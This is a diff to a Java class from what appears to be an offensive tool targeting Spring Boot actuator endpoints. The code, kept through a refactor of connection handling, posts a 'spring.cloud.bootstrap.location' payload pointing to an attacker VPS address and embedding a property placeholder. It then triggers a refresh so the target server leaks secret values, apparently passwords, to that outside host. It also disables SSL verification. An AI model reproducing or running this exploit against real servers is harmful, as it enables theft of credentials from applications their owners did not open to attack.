@@ -1,22 +1,14 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
-import java.io.BufferedReader;
 import java.io.IOException;
-import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
-import java.net.MalformedURLException;
-import java.net.ProtocolException;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.List;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class GetSpPassWord_III {
     private final String address;
@@ -37,15 +29,9 @@ public class GetSpPassWord_III {
         String refsite = address +refapi;
         String expdata = "spring.cloud.bootstrap.location=http://%s/?=${%s}";
         String data = String.format(expdata,vpsIP+":"+vpsPORT,args);
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
             conn.setDoOutput(true);
@@ -55,10 +41,7 @@ public class GetSpPassWord_III {
             }
             int responseCode = conn.getResponseCode();
             if(responseCode == HttpURLConnection.HTTP_OK){
-                URL obj1 = new URL(refsite);
-                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn1.setRequestProperty("User-Agent",ua);
+                HttpURLConnection conn1 = HTTPConfig.createConnection(refsite);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                 conn1.setDoOutput(true);
@@ -85,15 +68,9 @@ public class GetSpPassWord_III {
         String refsite = address +refapi;
         String expdata = "{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://%s/?=${%s}\"}";
         String data = String.format(expdata,vpsIP+":"+vpsPORT,args);
-        String ua = "";
         disableSSLVerification();
         try {
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
             try (OutputStream os = conn.getOutputStream()) {
@@ -102,10 +79,7 @@ public class GetSpPassWord_III {
             }
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK){
-                URL obj1 = new URL(refsite);
-                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                ua = uacf.getRandomUserAgent(ualist);
-                conn.setRequestProperty("User-Agent",ua);
+                HttpURLConnection conn1 = HTTPConfig.createConnection(refsite);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                 conn1.setDoOutput(true);
@@ -127,14 +101,8 @@ public class GetSpPassWord_III {
     }
     public void Exp(ResultCallback callback) throws IOException {
         String site = address + "/env";
-        String ua = "";
         disableSSLVerification();
-        URL obj = new URL(site);
-        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-        UA_Config uacf = new UA_Config();
-        List<String> ualist = uacf.loadUserAgents();
-        ua = uacf.getRandomUserAgent(ualist);
-        conn.setRequestProperty("User-Agent",ua);
+        HttpURLConnection conn = HTTPConfig.createConnection(site);
         conn.setRequestMethod("GET");
         int responseCode = conn.getResponseCode();
         if (responseCode == HttpURLConnection.HTTP_OK){
